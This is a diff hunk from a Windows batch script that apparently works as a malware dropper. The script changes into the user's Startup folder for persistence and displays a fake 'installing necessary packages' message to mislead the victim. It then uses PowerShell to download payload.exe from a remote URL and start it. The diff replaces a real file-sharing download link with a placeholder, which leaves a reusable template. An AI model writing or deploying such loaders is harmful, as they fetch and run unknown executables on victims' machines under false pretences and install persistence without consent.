@@ -62,5 +62,5 @@ cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 echo msgbox "Hey! Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
 wscript %tmp%\tmp.vbs
 del %tmp%\tmp.vbs
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/ZSwCSxGN/download', '.\payload.exe') }
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://direct-url/foryour-payload', '.\payload.exe') }
 start payload.exe
